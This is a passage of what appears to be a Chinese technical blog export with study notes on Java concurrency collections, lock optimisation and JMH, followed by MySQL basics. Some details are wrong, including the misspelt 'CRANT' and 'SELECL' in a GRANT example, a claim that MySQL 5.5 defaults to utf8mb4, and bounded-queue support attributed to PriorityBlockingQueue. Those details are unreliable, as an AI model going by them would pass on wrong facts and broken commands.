Sharing）的问题。\n伪共享是指多个线程同时访问不同的变量，但这些变量位于同一缓存行中。由于缓存行是处理器缓存的最小单位，当一个线程修改了缓存行中的一个变量，该缓存行会被标记为”脏”，其他线程在访问同一缓存行中的其他变量时，需要将该缓存行从其他处理器的缓存中读取到自己的缓存中，这个过程称为”缓存行的失效”（Cache Line Invalidation）。这种失效操作会导致性能下降，尤其在多核处理器中更为明显。\n@jdk.internal.vm.annotation.Contended 注解的作用就是通过在变量之间添加填充（Padding）来解决伪共享的问题。填充是在变量之间插入一些无意义的字段，使得它们位于不同的缓存行中，从而避免了伪共享导致的性能下降。\n\n\n\n同步集合同步集合指的是在对集合进行修改时，需要对整个集合加锁，保证修改的原子性和线程安全。\nVectorVector实现了List接口，底层是数组，Vector类保证方法线程安全的方式是在方法上添加synchronized关键字。\nStackStack 继承自 Vector 类，在此基础上还增加了一个栈数据结构（FILO），实现了线程安全的栈操作。\nHashtableHashtable是一个散列表类，实现了线程安全的 key-value 操作。底层结构是数组+链表，数组是 Hashtable 的主体，链表则是为了解决哈希冲突而存在的。是线程安全的。\n同步包装器java.util包下的Collections类中的synchronizedXxx方法就是Java的同步包装器。如果要讲非线程安全的集合类，如ArrayList、HashMap，转换成线程安全的类，则需要使用Java提供的同步包装器。\n使用示例：\n//使用同步包装器将ArrayList对象转为同步集合类的对象List&lt;Object&gt; synchronizedList = Collections.synchronizedList(new ArrayList&lt;&gt;());\n\n同步集合的缺陷\n性能问题\n同步集合大量使用了synchroized关键字修饰整个方法，使用的是重量级锁，在部分场景下，如读多写少等，性能低。\n\n竞态条件问题\n同步集合可以保证每种方法单独操作的原子性，但是不能保证方法组合起来的复杂操作的原子性。当程序中出现复合操作时，有可能出现竞态条件问题。\n\n备注：\n竞态条件（Race Condition）是指，当两个或多个线程对同一共享资源进行读写操作时，最终的结果取决于线程执行的相对速度和调度顺序，从而导致程序出现不确定性结果的问题。\n一个经典的例子是，两个线程 T1 和 T2 同时对共享资源 X 进行读取和加 1 操作，如果 T1 先读取了 X 的值，然后进行加 1 操作，但在 T1 执行完加 1 操作前，T2 也读取了 X 的值并进行加 1 操作，然后 T1 再将自己的结果写入 X 中，这时候 X 的值就只加了 1 而不是 2，因此出现了不一致的情况。\n\n在使用同步集合进行复合操作时，对同步集合加锁，可以有效避免竞态条件问题。\n\n使用迭代器遍历问题\n使用迭代器遍历（本质上是复合操作）同步集合也会出现线程安全问题。比如两个启动线程，一个进行迭代读，另一个线程进行删除操作，就会抛出ConcurrentModificationException异常，说明在迭代读的过程中另一个线程执行了删除操作，所以，存在线程安全问题。\n解决办法也是对同步集合加锁。\n\n\n并发集合并发集合是指在对集合进行修改时，不需要对整个集合进行加锁的集合类的统称，可以支持高效的并发操作。\n并发List集合类CopyOnWriteArrayListCopyOnWriteArrayList采用了写时复制技术，即在写的时候复制一个副本。\nCopyOnWriteArrayList的底层是一个数组，对数组的读操作会直接返回原数组中的值，对数组的写操作会首先获取ReentrantLock独占锁，然后复制一份原数组的副本，在数组的副本上进行写操作，在执行完毕后，再将修改后的副本赋值给原数组的引用array。\n可以看出，CopyOnWriteArrayList存在的缺陷有：\n\n写操作时时间、空间开销大，适合写少读多的场景。\n不能保证数据的实时一致性，因为在修改数组的过程中的如果其它线程读，读到的是原数组的值，不一定是修改后的最新值。\n\nCopyOnWriteArrayList的优点有：\n\n读取数据的性能高\n\n在使用Iterator遍历CopyOnWriteArrayList时，实际上遍历的是array引用指向的原数组。\n并发Map集合类ConcurrentHashMapJava1.7的 ConcurrentHashMap：\nJava1.7及之前的版本，ConcurrentHashMap使用的是Segment组、 HashEntry数组和链表实现的，结构见下图。在并发修改ConcurrentHashMap中的数据时，只会针对Segment数组中的对应元素加锁（Segment分段锁）。\n\nJava1.8的 ConcurrentHashMap：\nJava1.8及之后的版本，ConcurrentHashMap不再使用Segment分段锁 方案，而使用和HashMap相同的结构，也就是Node 数组、链表 &#x2F; 红黑树的结构，见下图，并使用CAS+synchronized锁的方式保证线程安全。在并发修改ConcurrentHashMap中的数据时，只会针对Node（实际上是Node类的子类TreeBin）数组（对象名为table）中的对应元素加锁。\n\ntable数组扩容的规则：\n\n当链表长度大于或等于8，并且数组长度小于64时，进行数组扩容。\n已使用数量&#x2F;总容量的比值达到负载因子（默认是0.75，可以在构造对象的时候传入其它值作为负载因子）后，进行数组扩容。\n\n链表转红黑树的规则：\n\n当链表长度大于或等于8，并且数组长度大于或等于64时，链表会转换为红黑树。\n\n红黑树转链表的规则：\n\n当链表的长度小于等于6时，红黑树会转换为链表。\n\nConcurrentHashMap的sizeCtl成员变量：\n\n在未初始化的阶段，sizeCtl记录了table数组的初始容量。\n在初始化的过程中，或在table扩容过程中，sizeCtl会被通过CAS操作赋值为-1。\n在初始化完成后，sizeCtl会记录当前table数组的扩容阈值。\n\nConcurrentSkipListMapConcurrentSkipListMap底层使用了跳表数据结构，索引节点是Index类。key是有序的。\n跳表的实现方法是在链表的基础上加索引，每一级索引也是一个链表，通过增加索引的层级来提高查找数据的效率，并且高层索引中的节点会存在一个指向低层级索引节点的指针。使用跳表查找数据的时间复杂度是O(logn)。\n并发Set集合类CopyOnWriteArraySetCopyOnWriteArraySet的底层是基于CopyOnWriteArrayList实现的，所以特点和CopyOnWriteArrayList一样。\nCopyOnWriteArraySet的add方法也是直接调用了CopyOnWriteArrayList的addIfAbsent方法。\nConcurrentSkipListSetConcurrentSkipListSet底层是基于ConcurrentSkipListMap，Java1.7版本时加入。与CopyOnWriteArraySet不同的是，ConcurrentSkipListSet是有序的。ConcurrentSkipListSet的底层使用了跳表。\n并发Queu集合类之阻塞队列并发阻塞队列概述特性\nJava中的并发阻塞队列中对于支持有界队列（可以设置队列容量）的并发阻塞队列，当队列满时会阻塞执行添加操作的线程，直到队列数据被消费，执行添加操作的线程才会被唤醒。\n当队列为空时并发阻塞队列会阻塞执行消费操作的线程，直到队列中添加了新数据，执行消费操作的线程才会被唤醒。\n并发阻塞队列可以分为单端阻塞队列和双端阻塞队列。单端阻塞队列只能向队列的一端添加数据，且只能从另一端消费数据。双端阻塞队列可以分别在队列两端添加数据或者消费数据。\nJava中除了LinkedTransferQueue（队列为空时会生成并添加一个null元素），其它所有并发阻塞队列的元素都不能为null。\n类的继承关系\nJava中的并发阻塞队列类都实现了BlockingQueue接口（LinkedTransferQueue和LinkedBlockingDeque是间接实现的，分别实现了TransferQueue和BlockingDeque接口，这些接口又继承了BlockingQueue接口），该接口规定了对于数据的添加、删除和获取有4钟不同的处理方式，分别为抛出异常、返回值、阻塞和限时返回：\n\n\n\n\nThrows exception\nSpecial value\nBlocks\nTimes out\n\n\n\nInsert\nadd(e)\noffer(e)\nput(e)\noffer(e, time, unit)\n\n\nRemove\nremove()\npoll()\ntake()\npoll(time, unit)\n\n\nExamine\nelement()\npeek()\nnot applicable\nnot applicable\n\n\n应用\n使用阻塞队列能够实现多个线程之间以线程安全的方式进行数据共享。\n并发阻塞队列有两个典型的应用案例，一个是生产者-消费者模式，另一个是按周期执行定时任务。\n\n生产者-消费者模式可以使用并发阻塞队列实现。之所以是使用并发阻塞队列，而不是非并发阻塞队列，原因是，阻塞队列能够实现消费者线程在阻塞队列为空的时候阻塞，在队列非空的时候被唤醒，以及生产者线程在阻塞队列满的时候阻塞，在队列不满的时候被唤醒；而非并发阻塞队列不存在阻塞和唤醒功能。\n使用并发阻塞队列的DelayQueue可以非常方便地执行定时任务。\n\nArrayBlockingQueueArrayBlockingQueue是基于数组实现的，线程安全的有界阻塞队列，且仅支持有界，即所有构造函数都需要指定队列容量。\n支持公平和非公平两种线程访问方式。\nLinkedBlockingQueueLinkedBlockingQueue是基于链表实现的，线程安全的阻塞队列。支持无界和有界队列。\nPriorityBlockingQueuePriorityBlockingQueue是基于堆实现的，带优先级的无界阻塞队列，元素按照比较规则进行排序。支持无界和有界队列。\nDelayQueueDelayQueue是基于PriorityQueue（底层基于堆）实现的，支持延时获取数据的无界阻塞队列，元素按照过期时间进行排序。\n添加到DelayQueue中的元素必须实现Delayed接口。\nSynchronousQueueSynchronousQueue底层基于CAS实现的无界阻塞队列，内部不存储元素。对SynchronousQueue的添加操作必须等待其它线程执行删除操作，才能执行，同样的，对SynchronousQueue的删除操作也必须等待其它线程执行添加操作。\n支持公平和非公平两种线程访问方式。\nLinkedTransferQueueLinkedTransferQueue是由链表实现的无界阻塞队列，实现了TransferQueue接口，TransferQueue接口继承了BlockingQueue接口，相比其它阻塞队列多了tryTransfer和transfer等方法。\nLinkedTransferQueu采用预占模式读写数据。\n在消费者线程从LinkedTransferQueue中获取数据时，如果LinkedTransferQueue中存在数据，则直接获取数据并返回。如果LinkedTransferQueue为空，就会生成一个元素为null的节点添加到LinkedTransferQueue中，并且消费者会在这个节点上阻塞等待；在后续生产者线程调用transfer方法时，不会将数据添加到LinkedTransferQueue中，而是将数据直接传递给消费者线程，如果未发现有在LinkedTransferQueue节点上等待的消费者线程，就会将数据添加到LinkedTransferQueue中，然后阻塞等待，直到有其他消费者线程获取添加的元素。\nLinkedBlockingDequeLinkedBlockingDeque是一个基于双向链表实现的双向阻塞队列，能够从队列两端添加和删除数据，支持先进先出和先进后出。支持无界和有界队列。\n创建LinkedBlockingDeque时可以指定容量，如果不指定，则默认队列的容量是Integer.MAX_VALUE。\n并发Queu集合类之非阻塞队列并发非阻塞队列概述并发阻塞队列的实现大都基于ReentrantLock锁，与并发阻塞队列不同的是，并发非阻塞队列是基于CAS自旋锁实现的，在并发非阻塞队列上读写数据时，线程不会阻塞。\n并发非阻塞队列可以分为单端非阻塞队列和双端非阻塞队列。\n类的继承关系\n并发非阻塞队列都实现了Queue接口，并且都是基于链表实现的无界队列。\nJava中的并发非阻塞队列类都实现了Queue接口（ConcurrentLinkedDeque是间接实现，ConcurrentLinkedDeque实现了Deque接口，该接口又继承了Queue接口），该接口规定了对于数据的添加、删除和获取有2钟不同的处理方式，分别为抛出异常和返回值：\n\n\n\n\nThrows exception\nReturns special value\n\n\n\nInsert\nadd(e)\noffer(e)\n\n\nRemove\nremove()\npoll()\n\n\nExamine\nelement()\npeek()\n\n\nConcurrentLinkedQueueConcurrentLinkedQueue是基于链表实现的无界非阻塞队列，没有保存队列的元素数量，其size操作是通过遍历计算元素数量实现的。\nConcurrentLinkedDequeConcurrentLinkedDeque是基于链表实现的无界非阻塞队列，没有保存队列的元素数量。\nJVM自带的锁优化锁消除锁消除的前提的JVM开启了逃逸分析，如果JVM通过逃逸分析发现对象只能被一个线程访问到，就不对这个对象加锁。即便程序中使用了同步锁，JVM也会将锁消除。\nJVM参数：\n\n开启逃逸分析：-XX:+DoEscapeAnalysis\n开启同步锁消除：-XX:+EliminateLocks\n\n如下代码，尽管StringBuffer的append()是被synchronized修饰的，但是不存在线程竞争，JVM会进行锁消除。\npublic String method()&#123;    StringBuffer sb = new StringBuffer();    sb.append(&quot;1&quot;);//append()是被synchronized修饰的    sb.append(&quot;2&quot;);    return sb.toString();&#125;\n\n锁粗化由于锁的竞争和释放开销比较大，如果代码中对锁进行了频繁的竞争和释放，那么JVM会进行优化，将锁的范围适当扩大。\n如下代码，在循环内使用synchronized，JVM锁粗化后，会将锁范围扩大到循环外。\npublic void method()&#123;    for (int i= 0; i &lt; 100; i++) &#123;        synchronized (this)&#123;            ...        &#125;    &#125;&#125;\n\n粗化后：\npublic void method()&#123;    synchronized (this)&#123;        for (int i= 0; i &lt; 100; i++) &#123;      \t\t...          \t&#125;    &#125;&#125;\n\n虽然JVM内部会进行优化，但是最好还是在代码里就优化了。\n锁优化方案\n减小锁的范围\n缩小锁的范围就是缩短持有锁的时间，减轻阻塞。\n最简单的做法是将一些不会产生线程安全问题的代码移到同步代码块之外，比如把不会产生线程安全问题的I&#x2F;O类耗时的操作，放在同步代码块之外。\n\n减小锁的粒度\n减小锁的粒度就是缩小锁定对象的范围，就能够减少锁的竞争。\n做法是把对大对象的加锁转换为对小对象的加锁，比如一个类中的多个方法都是对this加锁，按照减小锁粒度的思路就可以转换为只对每个方法中用到的临界区对象加锁。\n\n锁分离\n锁分离就是把锁拆分为读锁和写锁，规则是读读不互斥、读写和写写互斥\n锁分离最典型的应用是ReadWriteLock（读&#x2F;写锁）\n\n锁分段\n锁分段就是对一组对象上的锁进行分解，以减小锁的粒度。\n锁分段的典型应用是ConcurrentHashMap，ConcurrentHashMap将数据按照不同的数据段进行存储（使用了一个包含16个锁的数组），并为每一个数据段分配一把锁（第N个数据交给第N%16把锁保护）。\n\n避免热点区域\n避免热点区域是对热点区域（经常被访问的临界区）进行优化。\n\n使用独占锁的替换方案\n要保证线程安全，还可以根据需要使用下面的方案替换独占锁：\n\n并发容器\n读&#x2F;写锁\n乐观锁（如使用了CAS操作的原子类）\nfinal关键字修饰的不可变对象（final修饰的的变量是不可变的，不存在线程安全问题）\n\n\n\n分工问题的实现方式Guarded Suspension模式\nThread-Pre-Message模式\n生产者-消费者模式\n两阶段终止模式\nWorker-Thread模式\nBalking模式\nParallelStreamParallelStream 是 JDK 8 中新增的流式 API，它继承自 Java.util.stream.Stream 接口，并提供了并行流（Parallel Stream）处理能力。\n与普通流不同的是，ParallelStream 可以利用多个线程（默认情况下是 ForkJoinPool 中的线程）来并行执行部分或全部流处理操作，以加速大容量数据的处理和分析。在并行流执行流处理操作时，它会将数据划分成多个小块，并分别交给不同的线程进行处理，在处理完成后再将结果合并返回。\nParallelStream 支持大部分 Stream 的 API 操作，例如 filter、map、reduce、sorted 等，只需要调用 parallel() 方法即可将一个普通流转换为并行流。需要注意的是，由于并行流涉及到多线程的协作，因此在使用 ParallelStream 时需要考虑线程安全和共享变量等问题，避免出现并发问题和数据异常。\n以下是一个 ParallelStream 的示例代码：\nList&lt;String&gt; list = Arrays.asList(&quot;java&quot;, &quot;python&quot;, &quot;scala&quot;, &quot;ruby&quot;, &quot;go&quot;);long count = list.parallelStream().filter(str -&gt; str.length() &gt; 4).count();System.out.println(count);\n\n以上代码演示了如何使用 ParallelStream 统计字符串列表中长度大于 4 的字符串数量。由于 ParallelStream 默认使用 ForkJoinPool 的线程池来执行并行计算，因此可以实现更高效的数据统计和分析。\nJMH概述JMH是一款由JVM团队开发的、专门对代码进行基准测试的工具类。\n\n备注：\n基准测试（Benchmark）是一种评估程序性能的方法。通过设计和实现一组具有代表性的测试用例，来测量程序在给定硬件、操作系统和运行环境下的性能指标，如执行时间、内存占用、CPU 占用率等。\n基准测试可以帮助开发人员发现和改正代码中的性能问题，以及比较不同程序或算法之间的性能差异。它也可以为程序优化提供指导，并且对于不同平台或环境下的性能比较也具有参考价值。\n\n使用方法\n导入依赖：使用JMH需要在项目中添加jmh-core和jmh-generator-annprocess依赖。\n创建测试类，在测试类上添加注解@BenchmarkMode、@Warmup、@Measurement、@Threads 等。\n在上一步创建的测试类中编写测试方法，在测试方法上添加注解@Benchmark。\n运行测试方法，测试结果会以表格形式展示出来。\n\n使用示例import org.openjdk.jmh.annotations.*;@BenchmarkMode(Mode.AverageTime)@Warmup(iterations = 3, time = 1)@Measurement(iterations = 5, time = 1)@Threads(8)public class MyBenchmark &#123;    @Benchmark    public void testMethod() &#123;        // 测试代码    &#125;&#125;\n\n在这个示例中，我们定义了一个名为 MyBenchmark 的基准测试类，其中：\n\n@BenchmarkMode 注解指定了测试模式为平均执行时间。\n@Warmup 注解指定了预热次数为 3 次，每次预热时间为 1 秒钟。\n@Measurement 注解指定了测试次数为 5 次，每次测试时间也为 1 秒钟。\n@Threads 注解指定了线程数量为 8。\n\n在方法上，我们使用 @Benchmark 注解来标注需要测试的方法，然后在测试代码中编写需要测试的逻辑。\n使用JMH进行吞吐量测试示例吞吐量（Throughput）指的是在一定时间内能够处理的事务或请求数量，通常用单位时间内完成的请求数量来衡量系统&#x2F;程序的性能。\nJMH 的 Throughput 测试模式用于测试程序的吞吐量，即在给定时间段内程序能够处理的请求总数。\n下面是一个简单的 JMH 吞吐量测试示例：\nimport org.openjdk.jmh.annotations.*;@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3, time = 1)@Measurement(iterations = 5, time = 1)@Threads(8)public class MyBenchmark &#123;    @Benchmark    public void testMethod() &#123;        // 测试代码    &#125;&#125;\n\n在这个示例中，我们使用了 @BenchmarkMode 注解来指定测试模式为 Mode.Throughput，表示通过统计每单位时间内执行的操作次数来评估程序性能。同时，我们仍然需要设置预热次数、测试次数和线程数量等参数，以确保测试结果的准确性。\n使用JMH进行QPS&#x2F;TPS测试示例QPS（Queries Per Second）和 TPS（Transactions Per Second）都是指每秒钟能够处理的请求数或事务数量，是评估系统性能的重要指标。\nJMH 中没有直接提供 QPS&#x2F;TPS 模式的测试，但通过计算每秒钟能够完成的迭代次数，我们也可以得出相应的指标。\n下面是一个简单的 JMH QPS&#x2F;TPS 测试示例：\nimport org.openjdk.jmh.annotations.*;@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3, time = 1)@Measurement(iterations = 5, time = 1)@Threads(8)@OutputTimeUnit(TimeUnit.SECONDS)public class MyBenchmark &#123;    @Benchmark    public void testMethod() &#123;        // 测试代码    &#125;&#125;\n\n在这个示例中，我们同样使用了 @BenchmarkMode 注解来指定测试模式为 Mode.Throughput，并且设置了预热次数、测试次数和线程数量等参数。除此之外，我们还添加了 @OutputTimeUnit 注解来指定输出结果的时间单位为秒。\n通过运行测试，并根据测试代码实际执行的操作计算得出每秒钟能够完成的操作次数，即可得到测试的 QPS&#x2F;TPS 值。最终的测试结果会以表格形式展示出来，包括平均值、方差、标准误差和置信区间等统计数据。\nReferences\n冰河. 深入理解高并发编程: JDK核心技术. 北京: 电子工业出版社, 2022.6.\n冰河. 深入理解高并发编程: 核心原理与案例实战. 北京: 电子工业出版社, 2023.2.\n尼恩等. Java高并发核心编程:加强版. 卷2, 多线陈、锁、JMM、JUC、高并发设计模式. 北京: 清华大学出版社, 2022.10.\nhttps://www.bilibili.com/video/BV1xK4y1C7aT?p=2&amp;vd_source=e229b568d11ab1ec4d7f50fb619a17b6\nhttps://docs.oracle.com/javase/8/docs/api/java/util/Queue.html\nhttps://javaguide.cn/cs-basics/operating-system/operating-system-basic-questions-01.html#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B\n\n","categories":["IT"],"tags":["并发"]},{"title":"MySQL","url":"/2023/05/06/MySQL/","content":"MySQL配置MySQL采用客户端-服务器架构，用户通过客户端程序发送增删改查请求，服务器程序收到请求后处理，并把处理结果返回给客户端。\n启动选项MySQL安装目录的bin目录下的执行文件中，有一些是服务器程序（如mysqld），有一些是客户端程序（如mysql）。在命令行中指定启动选项时需要在选项名前加上–前缀，对于有选项值的启动选项，选项名、&#x3D;、选项值之间不能有空白字符。部分选项名有短形式，使用短形式时，选项名前只加上一个-前缀，选项名和选项值之间可以没有间隙，部分短形式的选项名和选项值之间必须没有间隙，短形式的选项名是区分大小写的。\n配置文件大部分启动选项可以在配置文件中进行配置，MySQL程序启动时会在多个路径下寻找配置文件，不同的操作系统下，寻找配置文件的路径和路径的顺序也有所不同，如果在多个配置文件中设置了相同的启动选项，则以最后一个配置文件为准。\n如果不想让MySQL在默认的路径中搜索配置文件，可以在命令行中指定使用default-file选项指定配置文件的位置。\n使用配置文件进行配置时，等号两边可以有空白字符。\n系统变量如允许同时连入的客户端的数量、查询缓存的大小等都是MySQL的系统变量。\n查看系统变量的命令的语法：\nSHOW VARIABLES [LIKE 匹配的模式]\n\n系统变量的作用范围分下面两种：\n\nGLOBAL（全局范围）：影响服务器的整体操作。\n具有GLOBAL作用范围的系统变量可以称为全面变量。\n\nSESSION（会话范围）：影响某个客户端连接的操作。\n具有SESSION作用范围的系统变量可以称为会话变量。\n\n\n部分（有的系统变量是不能修改的，如MySQL的版本）系统变量可以在服务器运行过程中设置（即可设置全面变量，又可设置会话变量），且无需重启服务器；部分只能以启动选项的方式（在命令行中添加启动选项，或在配置文件中进行配置）进行设置（全面变量），如InnDB的页大小。\n设置系统变量的命令的语法：\nSET [GLOBAL|SESSION] 系统变量名 = 值;\n\n监视器打开MySQL监视器打开MySQL监视器的命令格式：\nmysql -u 用户名 -p密码\n\n或者使用命令：\nmysql -u 用户名 -p\n\n然后输入密码即可\n查看字符编码在监视器中查看MySQL中字符编码等的设置情况的命令：\nstatus\n\n或者使用命令：\nSHOW VARIABLES LIKE &#x27;char%&#x27;\n\n修改密码修改密码的命令：\nSET PASSWORD FOR root@localhost=PASSWORD(&#x27;新密码&#x27;)\n\n创建用户创建用户的命令：\nCREATE USER 新用户名 IDENTIFIED BY ‘新用户的密码’\n\n用户名需要按照“用户名@主机名”的方式写\n设置用户权限设置用户权限的命令：\nCRANT 赋予的权限 ON 数据库名.表名 TO 用户名\n\n“赋予的权限”如果是所有权限就设为“ALL”，如果仅允许SELECL和UPDATE就设置为“SELECT,UPDATE”\n如果是所有数据库的所有数据表，就设置为“*.*”\n退出监视器退出监视器的命令：\nexit\n\n或者使用命令：\nquit\n\n数据库MySQL的SQL语句后面需要加分号。\n创建数据库创建数据库的命令格式\nCREATE DATABASE 数据库名;\n\n指定使用的数据库use 数据库名\n\nuse不是SQL语句，所以不需要输入“;”\n在使用use选择数据库的状态下也能够操作其他数据库的表，如\nSELECT * FROM db2.table;\n\n在没有use db2的情况下也可以执行\n显示数据库显示当前已有的数据库显示当前已有的数据库的命令：\nSHOW DATABASES;\n\n显示当前使用的数据库SELECT DATABASE();\n\n删除数据库在MySQL中，可以使用DROP DATABASE语句来删除已经存在的数据库。以下是其基本语法：\nDROP DATABASE database_name;\n\n在这里，database_name是想要删除的数据库的名称。例如，如果想删除名为my_database的数据库，可以这样做：\nDROP DATABASE my_database;\n\n这将删除my_database数据库以及其中的所有表和数据。\n类似地，也可以使用IF EXISTS子句来避免在尝试删除不存在的数据库时出现错误，语法如下：\nDROP DATABASE IF EXISTS database_name;\n\n如果database_name存在，那么它将被删除。如果它不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。这对于自动化脚本或者不确定数据库是否存在时非常有用，因为它可以防止因尝试删除不存在的数据库而导致的错误。\n备份和恢复数据库MySQL有多种备份数据库的方式，包括物理备份和逻辑备份，在备份时，需要根据实际情况选择最合适的备份方式，并保证备份数据的一致性、完整性和安全性。\n\n物理备份\n\n物理备份是指直接备份MySQL服务器中数据文件的一种方式。这种备份方式直接将数据文件复制到指定的备份目录下，并保持与原始数据文件的完全一致，因此恢复时也很快速。\n物理备份包括两种主要类型：\n\n冷备份：停止MySQL服务后备份数据文件，优点是备份数据的一致性好，缺点是在备份期间无法进行数据库操作。\n热备份：不停止MySQL服务进行备份，优点是可以在备份时继续对数据库进行操作，缺点是备份数据可能会因为正在执行的事务而不完整或不一致。\n\n物理备份的命令可以使用Linux中的cp、rsync等命令，例如：\n$ cp -a /var/lib/mysql /backup/mysql_backup\n\n\n逻辑备份\n\n逻辑备份是指通过SQL语句来生成备份文件，备份数据以可读性较好的文本格式保存，因此备份数据相对于物理备份较大，但可以进行较为精细的筛选和处理。\n逻辑备份包括以下主要类型：\n\nmysqldump：可以备份指定的数据库或表，甚至可以备份数据库中的指定数据，生成.sql格式的备份文件。\nmydumper：适用于大型数据库，生成多个文件来备份数据。\nmysqlpump：在MySQL8.0及以上版本中提供了mysqlpump命令，该命令比mysqldump更快，也支持多线程和压缩。\n\n例如，使用mysqldump备份一个名为mydatabase的数据库：\n$ mysqldump -u root -p mydatabase &gt; mydatabase_backup.sql\n\n在备份时，需要注意一些重要的问题：\n\n备份文件应当保存在安全的位置，并进行良好的加密措施。\n常规的备份操作应当建立合理的时间间隔。\n对于生产环境的数据库，建议还使用主从复制等业务高可用方案来增加数据可靠性。\n\n恢复MySQL备份文件则相对较简单，可以使用以下命令进行：\n$ mysql -u root -p mydatabase &lt; mydatabase_backup.sql\n\n其中，mydatabase是需要恢复的数据库的名称，mydatabase_backup.sql是备份文件的路径。执行后，MySQL会将备份文件中的数据导入到MySQL服务器中，并重新生成所有的索引和约束条件，以保证数据的正确性和完整性。\n在MySQL中，如果备份文件中的数据字符编码与目标数据库不一致，恢复数据时可能会出现乱码等问题。为了避免这种情况，可以通过指定字符集参数来将备份文件中的数据以正确的字符编码导入到目标数据库中。\n以下是根据备份文件的字符集来重新设置字符集的命令示例：\n$ mysql -u root -p mydatabase --default-character-set=utf8 &lt; backup.sql\n\n其中，mydatabase是需要恢复的数据库的名称，backup.sql是备份文件的路径。–default-character-set选项用于指定字符集，可以根据实际情况设置编码类型和字符集。如果备份文件的字符编码为GBK，则可以将上述命令修改如下：\n$ mysql -u root -p mydatabase --default-character-set=gbk &lt; backup.sql\n\n在MySQL 5.5及以上版本中，默认的字符集为utf8mb4，因此如果备份文件中使用的是utf8或gbk等字符集，也需要显式地指定字符集参数。\n另外，在备份时也应当考虑到字符编码的问题，建议在备份时同时备份字符集相关的信息。例如，在进行逻辑备份时，可以添加–set-charset选项来确保备份数据使用与数据库相同的字符集。例如：\n$ mysqldump -u root -p mydatabase --set-charset &gt; mydatabase_backup.sql\n\n这样，在恢复数据时就无需再指定字符集，MySQL会自动使用与备份时相同的字符集导入数据。\n表创建表示例在MySQL中，可以使用CREATE TABLE语句来创建一个新的表。在CREATE TABLE语句中，可以指定表名，列名，列的数据类型以及任何附加的约束。\n以下是一个创建新表的基本示例：\nCREATE TABLE table_name (    column1 datatype constraint,    column2 datatype constraint,    column3 datatype constraint,    ....);\n\n在这个例子中，table_name是要创建的表的名称，column1、column2和column3是列的名称，datatype是列的数据类型，constraint是任何想在列上应用的约束。\n例如，假设想创建一个名为students的表，其中有id、name、age和email四个字段。可以这样做：\nCREATE TABLE students (    id INT AUTO_INCREMENT PRIMARY KEY,    name VARCHAR(100),    age INT,    email VARCHAR(100));\n\n在这个例子中：\n\nid是一个整数类型的列，它自动递增并且是表的主键。\nname和email都是变长字符类型的列，最大长度为100。\nage是一个整数类型的列。\n\n注意，每一行都需要以逗号结束，但是最后一行除外。最后，整个语句需要以分号结束。\n数据库名、表名、列名可以使用&#96;&#96;（反引号）括起来\n输入到列中字符串的值需要用’’（单引号）或者””（双引号）括起来\n创建表时指定字符编码：\nCREATE TABLE 表名 (列名1 数据类型1, 列名2 数据库类型2...) CHARSET=utf8;\n\n设置主键主键的特点：\n\n没有重复的值\n不允许输入空值（NULL）\n\n命令格式：\n在创建表时给主键字段后添加PRIMARY KEY\nCREATE TABLE 表名 (列名1 数据类型1 PRIMARY KEY, 列名2 数据库类型2...);\n\n设置唯一键唯一键（unique key）的特点\n\n不允许重复\n\n允许输入NULL\n\n\n在创建表时定义唯一键：\nCREATE TABLE table_name (  column1 data_type,  column2 data_type,  UNIQUE (column1));\n\n在已存在的表上添加唯一键：\nALTER TABLE table_nameADD UNIQUE (column1);\n\n设置列可以自动递增自动递增（AUTO_INCREMENT）可以应用于任何整数类型的列。AUTO_INCREMENT属性允许数据库自动为新记录生成一个唯一的数字。通常用于主键。\n使用AUTO_INCREMENT属性，需要满足以下几个条件：\n\n列必须被定义为NOT NULL，因为它必须有值。\n列必须被定义为整数类型（例如，INT，SMALLINT，MEDIUMINT，BIGINT）。\n每个表只能有一个AUTO_INCREMENT列。\n\n示例，将id列定义为AUTO_INCREMENT：\nCREATE TABLE employees (    id INT NOT NULL AUTO_INCREMENT,    name VARCHAR(100),    PRIMARY KEY(id));\n\nMySQL如何设置连续递增字段的初始值：\nCREATE TABLE tablename (    id INT(11) NOT NULL AUTO_INCREMENT,    name VARCHAR(255) NOT NULL,    PRIMARY KEY (id)) AUTO_INCREMENT=1000;\n\n如果已经创建了表，并且想改变AUTO_INCREMENT的值，可以使用ALTER TABLE命令：\nALTER TABLE tablename AUTO_INCREMENT = 1000;\n\n注意，不能将AUTO_INCREMENT的值设置为比当前最大值小的数，因如果这样做，MySQL将忽略此次设置并保持当前最大值。\n设置列的默认值在MySQL中，可以在创建表或修改表的时候设置字段的默认值。这个默认值将被用于任何未指定该列值的新行。\n\n在创建表的时候设置默认值：\n\nCREATE TABLE tablename (    columnname1 INT NOT NULL DEFAULT 1,    columnname2 VARCHAR(255) NOT NULL DEFAULT &#x27;default_value&#x27;);\n\n在这个例子中，我们创建了一个名为”tablename”的表，它有两个字段，”columnname1”和”columnname2”。对于”columnname1”，如果在插入新的行时没有指定它的值，那么它的值将默认为1。对于”columnname2”，如果在插入新的行时没有指定它的值，那么它的值将默认为’default_value’。\n\n修改已经存在的表，为字段设置默认值：\n\nMODIFY关键字用于修改表的列定义。它可以用来更改列的数据类型、长度、约束等。\nALTER TABLE tablename MODIFY columnname1 INT NOT NULL DEFAULT 1,MODIFY columnname2 VARCHAR(255) NOT NULL DEFAULT &#x27;default_value&#x27;;\n\n在这个例子中，我们更改了”tablename”表中”columnname1”和”columnname2”字段的默认值。\n注意，不能为NOT NULL的字段设置默认值为NULL。对于字符串类型的字段，默认值需要用引号引起来。对于日期和时间类型的字段，可以将默认值设置为CURRENT_TIMESTAMP。\n索引（创建、删除、查看、主键索引、唯一索引、全局索引）在MySQL中，索引是用来加速查询操作的一种数据结构。它们可以让数据库引擎快速找到表中的特定记录。如果事先在表上创建了索引，查找时就不需要对全表进行扫描，而是利用索引进行扫描。\n下面是一些关于MySQL索引的基础知识：\n\n创建索引： 创建索引可以使用 CREATE INDEX （关键字INDEX可以替换为关键字KEY）命令。例如：\nCREATE INDEX index_nameON table_name (column1, column2);\n\n在上面的命令中，index_name 是索引的名称，table_name 是要在其上创建索引的表的名称，column1 和 column2 是想在其中创建索引的列。\n\n删除索引： 删除索引可以使用 DROP INDEX 命令。例如：\nDROP INDEX index_name ON table_name;\n\n查看索引： 如果想看一个表的所有索引，可以使用 SHOW INDEX 命令。例如：\nSHOW INDEX FROM table_name;\n\n主键索引： 主键（PRIMARY 